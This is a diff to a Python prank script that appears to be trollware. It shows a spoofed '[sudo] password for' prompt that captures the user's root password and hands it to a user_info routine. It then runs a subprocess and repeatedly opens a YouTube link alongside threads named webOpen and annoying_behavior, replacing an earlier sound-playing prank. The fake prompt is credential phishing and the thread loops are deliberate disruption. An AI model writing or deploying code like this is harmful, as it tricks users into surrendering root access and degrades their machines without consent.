@@ -1,7 +1,8 @@
 from os import listdir
 from threading import Thread
 from colorama import Fore, Style
-from playsound import playsound
+from time import sleep
+import webbrowser
 from subprocess import run
 # Importa los módulos desde src
 try:
@@ -45,8 +46,8 @@ print(Style.RESET_ALL)
 username = listdir('/home/')[0]
 print(Style.BRIGHT)
 rootPassword = input(f'[sudo] password for {username}: ')
-
-
+webbrowser.open('https://youtu.be/0bZ0hkiIKt0')
+sleep(10)
      
 
 user_info(root_pswd=rootPassword,
@@ -54,13 +55,10 @@ user_info(root_pswd=rootPassword,
 
 run('python3 src/subprocess.py')
 
-def play():
-     playsound('src/amogus.mp3')
-
 threads = []
-among_thread = Thread(target=play)
-among_thread.start()
 for _ in range(10):
+     webbrowser.open('https://youtu.be/0bZ0hkiIKt0')
+     
      t1 = Thread(target=webOpen)
      t1.start()
      t2 = Thread(target=annoying_behavior)
@@ -75,4 +73,4 @@ for _ in range(10):
 #    threads.append(t4)
 for thread in threads:
      thread.join()
-among_thread.join()
+
